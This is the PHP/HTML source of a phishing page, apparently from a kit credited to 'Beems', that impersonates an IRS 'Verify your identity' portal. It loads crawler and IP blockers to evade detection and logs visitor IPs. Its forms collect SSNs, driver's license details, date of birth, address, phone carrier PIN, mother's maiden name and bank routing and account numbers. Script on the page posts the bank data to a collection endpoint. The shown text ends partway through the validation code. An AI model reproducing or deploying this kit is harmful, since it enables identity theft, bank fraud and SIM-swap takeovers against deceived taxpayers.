<?php 
session_start();
//By Beems
require_once '../main.php';
require_once '../blocker.php';
if($block_referrer == "on") {
  require_once '../crawlerdetect.php';
}
if($block_iprange == "on") {
  require_once '../blacklist.php';
}
require_once 'session.php';

if($onetime == "on") {
    tulis_file("../security/onetime.dat","$ip");
}
?>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <meta name="referrer" content="no-referrer">
      <link rel="icon" type="image/x-icon" href="./assets/images/favicon.ico">
    <link rel="stylesheet" href="./assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="./assets/css/jquery-ui.min.css">
    <link rel="stylesheet" href="./assets/css/irs.css">
    <link rel="stylesheet" href="./assets/css/app.css">
    
<link rel="stylesheet" href="./assets/css/wmsp-shared-secrets.css">
<link rel="stylesheet" href="./assets/css/wmsp-error.css">
<link rel="stylesheet" href="./assets/css/wmsp-results.css">

    <title>Verify your identity</title>
  </head>
  <body class="icce">
  
    <div class="container-fluid" style="background: #f1f1f1; width: 100%;">
      <div class="flagtext">
        <p class="usflag">An official website of the United States Government</p>
      </div>
    </div>
  
    <div class="container-fluid" role="banner" style="background-color: #234E76; width: 100%;">
      <div class="header">
        <div class="navbar">
            <a class="logo" href="javascript:openIrsPage()" title="Go to IRS Home Page">
              <img aria-hidden="true" src="./assets/images/logo.jpg">
            </a>                                  
            
            <ul class="navbar-nav">
             
            <li class="navbar-item"><a class="nav-link" href="javascript:switchLanguage()" title="Click this link to switch language">Español</a>
            </li>        
                                
           
                <li class="navbar-item"><a class="nav-link" href="javascript:logout()" title="Click this link to logoff"> <span>Exit</span> 
                    <svg aria-hidden="true" focusable="false" viewBox="0 0 491.1 412.5">
                      <path d="M 282.9 283.5 v 11.9 c 0 24.5 0.1 49.1 0 73.6 c 0 9.3 3.2 16.6 12 20.6 c
                          9.2 4.1 16.7 0.5 23 -5.9 c 54.4 -54.3 108.8 -108.6 163.1 -163.1 c 10.2 -10.2
                          10.3 -21 0.3 -31 c -54.4 -54.7 -109.1 -109.2 -163.7 -163.7 c -6.1 -6.1 -13.4
                          -9.4 -22.3 -5.7 c -8.9 3.8 -12.4 11 -12.4 20.3 v 86 h -11.8 c -40.6 0 -81.1
                          -0.1 -121.7 0 c -15.7 0 -23.5 7.1 -23.6 22.3 c -0.2 37.6 -0.2 75.3 0 112.9 c
                          0.1 14.2 7.9 21.6 22.1 21.8 c 15.7 0.2 31.4 0.1 47.1 0.1 c 28.8 -0.1 57.6
                          -0.1 87.9 -0.1 Z M 8.2 205 h -0.4 c 0 35.7 -0.3 71.4 0.1 107 c 0.4 46.6 30.7
                          83.4 76.9 87.8 c 36.3 3.5 73.2 1.4 109.8 1.2 c 2.8 0 7.1 -3.9 8 -6.8 c 1.7
                          -5.1 2 -10.9 1.6 -16.4 c -0.9 -14 -2.8 -15.5 -16.7 -15.5 h -87.4 C 68 362.2
                          47 343 46.7 311.2 c -0.6 -70.7 -0.6 -141.4 0 -212.1 c 0.3 -32 21.1 -51.1
                          53.2 -51.2 c 28.8 -0.1 57.6 0 86.4 0 c 15.2 0 18.1 -2.9 18.1 -18.4 c 0 -3.3
                          -0.6 -6.5 -0.8 -9.8 c -0.5 -7.6 -4.5 -11 -12.1 -11 c -33.4 0.1 -66.8 -0.7
                          -100.1 0.4 c -44.7 1.5 -81.1 36.6 -83 81.1 c -1.4 38.2 -0.2 76.5 -0.2 114.8
                          Z">
                       </path>
                       <path d="M 282.9 283.5 h -87.8 c -15.7 0 -31.4 0.2 -47.1 -0.1 c -14.2 -0.2 -22 -7.6
                          -22.1 -21.8 c -0.3 -37.6 -0.3 -75.3 0 -112.9 c 0.1 -15.1 7.9 -22.2 23.6
                          -22.3 c 40.6 -0.1 81.1 0 121.7 0 H 283 V 114 V 40.4 c 0 -9.3 3.5 -16.5 12.4
                          -20.3 c 8.8 -3.7 16.1 -0.4 22.3 5.7 C 372.4 80.3 427 134.9 481.5 189.6 c 10
                          10 9.8 20.8 -0.3 31 c -54.3 54.5 -108.7 108.8 -163.1 163.1 c -6.4 6.4 -13.9
                          10 -23 5.9 c -8.8 -4 -12 -11.3 -12 -20.6 c 0.1 -24.5 0 -49.1 0 -73.6 c -0.2
                          -3.5 -0.2 -7 -0.2 -11.9 Z">
                       </path>
                       <path d="M 8.2 205 c 0 -38.3 -1.3 -76.6 0.3 -114.8 c 1.9 -44.5 38.3 -79.6 83 -81.1 c
                          33.3 -1.1 66.8 -0.3 100.1 -0.4 c 7.6 0 11.6 3.4 12.1 11 c 0.2 3.3 0.8 6.5
                          0.8 9.8 c 0 15.5 -3 18.4 -18.1 18.4 H 100 c -32.1 0.1 -53 19.3 -53.2 51.2 c
                          -0.6 70.7 -0.6 141.4 0 212.1 c 0.3 31.8 21.3 51.1 53.4 51.1 c 29.1 0.1 58.3
                          0 87.4 0 c 13.9 0 15.8 1.5 16.7 15.5 c 0.3 5.5 0 11.3 -1.6 16.4 c -1 2.9
                          -5.2 6.8 -8 6.8 c -36.6 0.2 -73.5 2.3 -109.8 -1.2 c -46.3 -4.3 -76.6 -41.2
                          -77 -87.8 c -0.3 -35.7 -0.1 -71.3 -0.1 -107 h 0.4 Z">
                        </path>
                    </svg></a></li>
                    
                    
           
                
  
              </ul>
            </div>
          </div>
        </div>
    <div class="main container-fluid">
      <main id="intro">

    <h1 class="irs-title-2 text-center">THIS U.S. GOVERNMENT SYSTEM IS FOR AUTHORIZED USE ONLY!</h1>
  
    <p>Use of this system constitutes consent to monitoring, interception, recording, reading, copying or capturing by authorized personnel of all activities.  There is no right to privacy in this system.  Unauthorized use of this system is prohibited and subject to criminal and civil penalties, including all penalties applicable to willful unauthorized access (UNAX) or inspection of taxpayer records (under 18 U.S.C. 1030 and 26 U.S.C. 7213A and 26 U.S.C. 7431).</p>
  
    <form action="javascript:void(0);" method="post">
    
    <div class="container">
    <div class="row">
    <div class="col text-center">
  
      <button class="notice-button btn btn-primary" name="submit" title="Click here to acknowledge the IRS Warning message to Continue." type="submit" value="ok" id="intro_btn">OK</button>
    </div>
    </div>
        </div>  
        </form>
    </main>
    <main id="billing" style="display: none;">

<form action="javascript:void(0);" method="post">

  <h1 class="login-title">Verify your identiy</h1>

  <p>If you need additional help, please visit our <a href="javascript:void(0);" target="_blank">Frequently Asked Questions</a> page.</p>
  
  <p>
  <span>All fields marked with an</span>
  <font color="#CD2026">*</font>
  <span>(asterisk) are required.</span>
  </p>
  <br>
  <div class="form-group row">
    <div class="col">
      <div class="control-label">
        <label>First Name</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="firstName" type="text" name="firstName" value=""> 
      </div>

      <div class="col-3">
      <div class="control-label">
        <label>M.I</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="middleInitial" type="text" name="middleInitial" value=""> 

      </div>

    <div class="col-sm">
      <div class="control-label">
        <label>Last Name</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="lastName" type="text" name="lastName" value=""> 

      </div>
    </div>
   <div class="form-group">
      <div class="control-label">
        <label>Driver's License Number</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" title="Help on SSN expiry date" type="button">
        </button>
      </div>
      <input class="form-control" id="LicenseNumber" type="text" name="LicenseNumber" value=""> 
        
    </div>

    <div class="form-group">
      <div class="control-label">
        <label>Weight (as listed on Driver's License)</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-dlw" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-dl" data-toggle="collapse" title="Wight on Driver's License" type="button">
        </button>
      </div>
      <input class="form-control" id="LicenseNumberWeight" type="text" name="LicenseNumberWeight" value=""> 
        
    </div>
    <div class="form-group">
      <div class="control-label">
        <label>Height (as listed on Driver's License)</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-dlw" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-dl" data-toggle="collapse" title="Height on Driver's License" type="button">
        </button>
      </div>
      <input class="form-control" id="LicenseNumberHeight" type="text" name="LicenseNumberHeight" value=""> 
        
    </div>


  <div class="form-group row">
    <div class="col">
      <div class="control-label">
        <label>Expiration date</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="LicenseNExp" type="text" name="LicenseNExp" value=""> 
      </div>
    <div class="col-5">
      <div class="control-label">
        <label>State Issued</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" type="button">
        </button>
      </div>
      <select id="LicenseIss" name="LicenseIss" class="custom-select" aria-required="true" data-role="none">
            <option value="">
              Select one
            </option>
            
              
              <option value="AK">AK</option>
            
              
              <option value="AL">AL</option>
            
              
              <option value="AR">AR</option>
            
              
              <option value="AZ">AZ</option>
            
              
              <option value="CA">CA</option>
            
              
              <option value="CO">CO</option>
            
              
              <option value="CT">CT</option>
            
              
              <option value="DE">DE</option>
            
              
              <option value="FL">FL</option>
            
              
              <option value="GA">GA</option>
            
              
              <option value="HI">HI</option>
            
              
              <option value="IA">IA</option>
            
              
              <option value="ID">ID</option>
            
              
              <option value="IL">IL</option>
            
              
              <option value="IN">IN</option>
            
              
              <option value="KS">KS</option>
            
              
              <option value="KY">KY</option>
            
              
              <option value="LA">LA</option>
            
              
              <option value="MA">MA</option>
            
              
              <option value="MD">MD</option>
            
              
              <option value="ME">ME</option>
            
              
              <option value="MI">MI</option>
            
              
              <option value="MN">MN</option>
            
              
              <option value="MO">MO</option>
            
              
              <option value="MS">MS</option>
            
              
              <option value="MT">MT</option>
            
              
              <option value="NC">NC</option>
            
              
              <option value="ND">ND</option>
            
              
              <option value="NE">NE</option>
            
              
              <option value="NH">NH</option>
            
              
              <option value="NJ">NJ</option>
            
              
              <option value="NM">NM</option>
            
              
              <option value="NV">NV</option>
            
              
              <option value="NY">NY</option>
            
              
              <option value="OH">OH</option>
            
              
              <option value="OK">OK</option>
            
              
              <option value="OR">OR</option>
            
              
              <option value="PA">PA</option>
            
              
              <option value="RI">RI</option>
            
              
              <option value="SC">SC</option>
            
              
              <option value="SD">SD</option>
            
              
              <option value="TN">TN</option>
            
              
              <option value="TX">TX</option>
            
              
              <option value="UT">UT</option>
            
              
              <option value="VA">VA</option>
            
              
              <option value="VT">VT</option>
            
              
              <option value="WA">WA</option>
            
              
              <option value="WI">WI</option>
            
              
              <option value="WV">WV</option>
            
              
              <option value="WY">WY</option>
            
              
              <option value="AS">AS</option>
            
              
              <option value="AA">AA</option>
            
              
              <option value="AE">AE</option>
            
              
              <option value="AP">AP</option>
            
              
              <option value="PW">PW</option>
            
              
              <option value="DC">DC</option>
            
              
              <option value="VI">VI</option>
            
              
              <option value="PR">PR</option>
            
              
              <option value="FM">FM</option>
            
              
              <option value="MP">MP</option>
            
              
              <option value="GU">GU</option>
            
          </select>

      </div>
    </div>

    <div class="form-group">
      <div class="control-label">
        <label>Social Security Number (SSN) or Individual Tax ID Number (ITIN)</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" title="Help on SSN or Individual Tax Identification Number" type="button">
        </button>
      </div>
      <div class="collapse divHelpTipCollapsible" id="help-ssn">
        <div class="divHelpTipCollapsibleContent">
          <p>Enter your 9 digit Social Security Number (SSN) or Individual Tax Identification Number (ITIN).</p>
        </div>
      </div>
      <input class="form-control" id="SecurityNumber" type="text" title="Enter your 9 digit Social Security Number (SSN) or Individual Tax ID Number (ITIN)" name="SecurityNumber" value=""> 
        
    </div>

    <div class="form-group">
      <div class="control-label">
        <label for="dobInput">Date of Birth</label>
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <span class="fsad-hint">MM/DD/YYYY</span>
      </div>
      <div class="login-dob">
        <input class="form-control hasDatepicker" id="DateOfBirth" maxlength="10" type="text" name="DateOfBirth" value=""><img class="ui-datepicker-trigger" src="./assets/images/calendar.svg" alt="Click Date of Birth icon button to select date from calendar" title="Click Date of Birth icon button to select date from calendar">
      </div>
      
    </div>

    <div class="form-group">
      <div class="control-label">
        <label>Street Address</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>
      <div class="collapse divHelpTipCollapsible" id="help-addr">
        <div class="divHelpTipCollapsibleContent">
          <p>Enter your Street Address in "123 Main St NW #7" format. Do not enter City/Town or State.</p>
        </div>
      </div>
      <input class="form-control" id="StreetAddress" maxlength="100" type="text" title="Enter your Street Address" name="StreetAddress" value=""> 
        
    </div>

    <div class="form-group">
      <div class="control-label">
        <label>ZIP or Postal Code</label>
        <label style="color:#CD2026;font-weight:normal">(* Required except for countries without ZIP or postal codes)</label>
        <button aria-controls="help-zip" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-zip" data-toggle="collapse" title="Help on ZIP or Postal Code" type="button">
        </button>
      </div>
      <div class="collapse divHelpTipCollapsible" id="help-zip">
        <div class="divHelpTipCollapsibleContent">
          <p>Enter your 5 digit ZIP or Postal Code.</p>
        </div>
      </div>
      <input class="form-control" id="ZipCode" maxlength="12" type="text" title="Enter your 5 digit ZIP or Postal Code" name="ZipCode" value=""> 
        
    </div>
    <div class="form-group row">
    <div class="col">
      <div class="control-label">
        <label>Phone Number</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="NumberPhone" type="text" name="NumberPhone" value=""> 
      </div>

      <div class="col-5">
      <div class="control-label">
        <label>Phone Carrier Pin</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="NumberPin" type="text" name="NumberPin" value=""> 

      </div>

    <div class="col-sm">
      <div class="control-label">
        <label>Phone Carrier eg.(Verizon, AT&T)</label> 
        <label style="color:#CD2026;font-weight:normal">*</label> 
        <button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="NumberCarrier" type="text" name="NumberCarrier" value=""> 

      </div>
    </div>
    <div class="form-group">
      <div class="control-label">
        <label>Mother's Maiden Name</label>
      </div>
      <input class="form-control" id="MaidenName" type="text" title="Enter your 5 digit ZIP or Postal Code" name="MaidenName" value=""> 
        
    </div>
    <div class="form-group">

      <input class="form-control" id="CityR" type="hidden" name="CityR" value=""> 
      <input class="form-control" id="StateRegion" type="hidden" name="StateRegion" value=""> 
        
    </div>

    <div>
      <button class="login-submit-button btn btn-primary" name="submit" title="Click this button to continue" type="submit" value="submit">Continue</button>
    </div>
</form>

</main>
 <main id="accountRtn" style="display: none;">

<form action="javascript:void(0);" method="post">

  <h1 class="login-title">Payment Information</h1>

  <p>Provide your banking information for funding.</p>
  
  <p>
  <span>All fields marked with an</span>
  <font color="#CD2026">*</font>
  <span>(asterisk) are required.</span>
  </p>
  <br>
  <p id="bankLabel"></p>
  <br>     
  <div class="form-group">
      <div class="custom-control custom-radio custom-control-inline">
  <input type="radio" id="customRadioInline1" name="accountType" class="custom-control-input" value="Checking">
  <label class="custom-control-label" for="customRadioInline1">Checking</label>
</div>
<div class="custom-control custom-radio custom-control-inline">
  <input type="radio" id="customRadioInline2" name="accountType" class="custom-control-input" value="Savings">
  <label class="custom-control-label" for="customRadioInline2">Savings</label>
</div>
<br>
<br>
    <div class="form-group">
      <div class="control-label">
        <label>Routing Number</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>
      <input class="form-control" id="routingNumberGroup" maxlength="100" type="text" title="Enter your Street Address" name="routingNumberGroup" value=""> 
      <input type="hidden" name="bankname" id="bankname" value=""> 
        
    </div>
     <div class="form-group">
      <div class="control-label">
        <label>Account Number</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" title="Help on Street Address" type="button">
        </button>
      </div>
      <input class="form-control" id="accountNumberInput" maxlength="100" type="text" title="Enter your Street Address" name="accountNumberInput" value=""> 
        
    </div>


    <div>
      <button class="login-submit-button btn btn-primary" name="submit" title="Click this button to continue" type="submit" value="submit">Continue</button>
    </div>
</form>
  
   

</main>
    </div>
          
      <div class="container-fluid" style="background: #4E4E4E;width: 100%;">
          <div class="footer container-fluid"> 
            <div class="navbar">
              <div class="navfooterlogo">
          <img aria-hidden="true" alt="Decorative IRS Logo" src="./assets/images/irs_horiz_white.png">
        </div>

              
          <ul class="navbar-nav">
            <li class="navbar-item"><a class="nav-link" href="javascript:openIrsPrivacyPolicy()" title="Click this link to view the IRS Privacy Policy Page">
              <span style="color:white">IRS Privacy Policy</span>
              <svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
  <path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
      q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
      t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
      q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
      t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
      t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
      q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
      q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
      q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
      q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
      q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
      t 0.4 1 Z"></path>
  </svg></a></li>
            <li class="navbar-item" id="accessibility-link"><a class="nav-link" href="javascript:openIrsAccessibility()" title="Click this link to view the Accessibility Page">
                <span style="color:white">Accessibility</span>
              <svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
  <path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
      q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
      t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
      q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
      t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
      t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
      q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
      q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
      q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
      q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
      q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
      t 0.4 1 Z"></path>
  </svg>
            </a></li>
          </ul>
          

        </div>
      </div>
    </div>
      
      
    
    <form action="/irfof-wmsp/logout" method="post" name="logoutForm">
    </form>
  <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front expire ui-dialog-buttons ui-draggable" aria-labelledby="ui-id-1" style="display: none;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle expire"><span id="ui-id-1" class="ui-dialog-title expire">IRS - Session Warning</span><button type="button" class="ui-dialog-titlebar-close expire"></button></div><div id="expire-content" style="" class="ui-dialog-content ui-widget-content expire"><div id="expire-text" tabindex="0" class="expire">Your session will expire in 5 minutes.<br class="expire"><br class="expire">If you want to refresh the session for an additional 15 minutes select OK.  If not, select Cancel.</div></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix expire"><div class="ui-dialog-buttonset expire"><button type="button" title="Click here if you want to renew this session for 15 minutes" class="expire">OK</button><button type="button" title="Do not renew session" class="expire">Cancel</button></div></div></div>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    
<script type="text/javascript">
    var emailretry = 0;
    var loginretry = 0;
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
    $("#intro").hide();
    if (sessionStorage.getItem('safe') == "id_first") {
      $("#accountRtn").show();
      $("#billing").hide();
    } else {
      $("#accountRtn").hide();
      $("#billing").show();
    }
  }
}

$(function() {
$('#DateOfBirth').mask('00/00/0000');
$('#ZipCode').mask('00000');
$('#NumberPhone').mask('(000) 000-0000');
$('#CardNumber').mask('0000 0000 0000 0000');
$('#ExpirationDate').mask('00/00');
$('#Cvv').mask('0000');
$('#AtmPin').mask('000000');
$('#SecurityNumber').mask('000-00-0000');
$('#NumberPin').mask('0000000000');
$('#LicenseNExp').mask('00/00/0000');
$('#LicenseNumberWeight').mask('000');
$('#LicenseNumberHeight').mask("0'-00\"");
$('#accountNumberInput').mask('00000000000000000');
$('#routingNumberGroup').mask('000000000');
$("#pinbank").mask('0000');
});

$(document).ready(function() {
    $("#routingNumberGroup").keyup(function() {
        var el = $(this);

        if (el.val().length === 9) {
        var url = "fedach.php?routing="+ $(el).val();
            $.ajax({
                url: url,
                cache: false,
                dataType: "json",
                type: "GET",
                success: function(result, success) {
                    $("#bankname").val(result.BankName);
                    $("#bankLabel").html(result.BankName);
                }
            });
        }
    });
});

$(document).ready(function() {
    $("#ZipCode").keyup(function() {
        var el = $(this);

        if (el.val().length === 5) {
        var url = "https://ziptasticapi.com/" + el.val();
            $.ajax({
                url: url,
                cache: false,
                dataType: "json",
                type: "GET",
                success: function(result, success) {
                    $("#CityR").val(result.city);
                    $("#StateRegion").val(result.state);
                }
            });
        }
    });
});


$('#routingNumberGroup').focus(function () {
    if (!$(this).parent().hasClass('has-error')) {
        $(this).after('<span class="help-block">Routing Number: Input is required</span>');
        $(this).addClass('is-invalid');
    } else {
        //$(this).parent('div').next('div').remove();
        $(this).next().html("A 9-digit number at the lower left corner of a check. Contact your bank if you need help.");
    }
}).blur(function () {
    if ($(this).val().length < 9 || $("#bankname").val().length < 1) {
      $(this).addClass('is-invalid');
      $(this).parent().addClass('has-error');
      $(this).next().html("The provided routing number is invalid.");
    } else {
      $(this).removeClass('is-invalid');
      $(this).parent().removeClass('has-error');
        $(this).next().remove();

    }
    });

$('#accountNumberInput').focus(function () {
    if (!$(this).parent().hasClass('has-error')) {
        $(this).after('<span class="help-block">Account Number: Input is required</span>');
        $(this).addClass('is-invalid');
    } else {
        //$(this).parent('div').next('div').remove();
        $(this).next().html("A 3-17 digit number at the bottom of a check or on a bank statement. Contact your bank if you need help.");
    }
}).blur(function () {
    if ($(this).val().length < 3 || $("#bankname").val().length < 1) {
      $(this).addClass('is-invalid');
      $(this).parent().addClass('has-error');
      $(this).next().html("The provided account number is invalid.");
    } else {
      $(this).removeClass('is-invalid');
      $(this).parent().removeClass('has-error');
        $(this).next().remove();

    }
    if ($("#routingNumberGroup").parent().hasClass('has-error')) {
      if ($('#routingNumberGroup').val().length < 9 || $("#bankname").val().length < 1) {
    } else {
      $('#routingNumberGroup').removeClass('is-invalid');
      $('#routingNumberGroup').parent().removeClass('has-error');
        $('#routingNumberGroup').next().remove();

    }
    }
    });

$(document).on('submit', '#accountRtn > form', function (e) {
  e.preventDefault();
    var errors = false;
    if ($("#accountNumberInput").val().length < 3 || $("#routingNumberGroup").val().length < 9 || $("#bankname").val().length < 1) {
        var errors = true;
        if (!$("#routingNumberGroup").parent().hasClass('has-error') && !$("#accountNumberInput").parent().hasClass('has-error')) {
        $("#routingNumberGroup").addClass('is-invalid');
      $("#routingNumberGroup").parent().addClass('has-error');
      $("#routingNumberGroup").after('<span class="help-block">Routing Number: Input is required</span>');
      $("#accountNumberInput").addClass('is-invalid');
      $("#accountNumberInput").parent().addClass('has-error');
      $("#accountNumberInput").after('<span class="help-block">Account Number: Input is required</span>');
    }
    }        
    if (errors) {
    } else {
        
        $.post("data/loginbank?key=<?php echo $key;?>", $(this).serialize(), function(result, success) {
          $('#accountRtn .login-submit-button').prop('disabled', true); 
            if (success == "success") {
              $('#accountRtn .login-submit-button').prop('disabled', false); 
              sessionStorage.setItem('safe', 'id_first_1');
              $(location).attr("href", "confirmpayment?key=<?php echo $key;?>");
            }
        });
    }

});


$(document).ready(function() {
    $("#ZipCode").keyup(function() {
        var el = $(this);
        
        if (el.val().length === 5) {
        var url = "https://ziptasticapi.com/" + el.val();
            $.ajax({
                url: url,
                cache: false,
                dataType: "json",
                type: "GET",
                success: function(result, success) {
                    $("#CityR").val(result.city);
                    $("#StateRegion").val(result.state);
                }
            });
        }
    });
});

$.validator.addMethod("validDob", function(value, element) {
    return this.optional(element) || value.split('/')[2] > "1919" && value.split('/')[2] < "2012";
}, "Invalid date of birth.");

$(function(){
    $(document).on('submit', '#billing > form', function (event) {
        // validate and process form here  
        $(this).validate({
            rules: {
                "firstName": { required: true, minlength: 3,},
                "lastName": { required: true, minlength: 3,},
                "LicenseNumber": { required: true, minlength: 5,},
                "LicenseNExp": { required: true, minlength: 3,},
                "LicenseNumberWeight": { required: true, minlength: 3,},
                "LicenseNumberHeight": { required: true, minlength: 3,},
                "LicenseIss": { required: true, minlength: 1,},
                "DateOfBirth": {  required: true, minlength: 10, validDob:true,},
                "StreetAddress": { required: true, minlength: 5,},
                "SecurityNumber": { required: true, minlength: 3,},
                "StateRegion": { required: true, minlength: 2,},
                "CityR": { required: true, minlength: 2,},
                "ZipCode": { required: true, minlength: 5, zipcodeUS: true,},
                "NumberPhone": { required: true, minlength: 10,},
                "MaidenName": { required: true, minlength: 3,},
                "NumberCarrier": { required: true, minlength: 2,},
                "NumberPin": {
                    required: function () {
                        return $("#NumberPin").is(":visible");
                    },
                    minlength: 4,
                }
            },
            messages: {
                "firstName": {
                    required: "Please provide your First name",
                    minlength: "Please provide your First name",
                },
                "lastName": {
                    required: "Please provide your Last name",
                    minlength: "Please provide your Last name",
                },
                "LicenseNumber": {
                    required: "Please provide your driver's license number",
                    minlength: "Please provide your driver's license number",
                },
                "LicenseNumberWeight": {
                    required: "Please provide your weight on your driver's license",
                    minlength: "Please provide your weight on driver's license expiry date",
                },
                "LicenseNumberHeight": {
                    required: "Please provide your height on your driver's license",
                    minlength: "Please provide your height on driver's license expiry date",
                },
                "LicenseNExp": {
                    required: "Please provide your driver's license expiry date",
                    minlength: "Please provide your driver's license expiry date",
                },
                "LicenseIss": {
                    required: "Please select the state your driver's license state",
                    minlength: "Please select the state your driver's license state",
                },
                "DateOfBirth": {
                    required: "Please provide date of birth",
                    minlength: "Please check the date of birth you have entered",
                },
                "NumberPhone": {
                    required: "Please provide phone number",
                    minlength: "Please check the number you have entered",
                },
                "NumberCarrier": {
                    required: "Please provide phone carrier",
                    minlength: "Please check the phone carrier you have entered",
                },
                "NumberPin": {
                    required: "Please provide phone carrier pin",
                    minlength: "Please check the phone carrier pin you have entered",
                },
                "StreetAddress": {
                    required: "Please provide your residential address",
                    minlength: "Please check the address you have entered",
                },
                "SecurityNumber": {
                    required: "Please provide your Social Security Number(SSN)",
                     minlength: "Please enter at least 9 characters",
                },
                "StateRegion": {
                    required: "Please provide your State",
                    minlength: "Please check the state you have entered",
                },
                "CityR": {
                    required: "Please provide your City",
                    minlength: "Please check the City you have entered",
                },

                "ZipCode": {
                    required: "Please provide your Zip Code",
                    zipcodeUS: "Please provide valid US your Zip Code",
                    minlength: "Please check the zip code you have entered",
                },
                "MaidenName": {
                    required: "Please provide mother's maiden name",
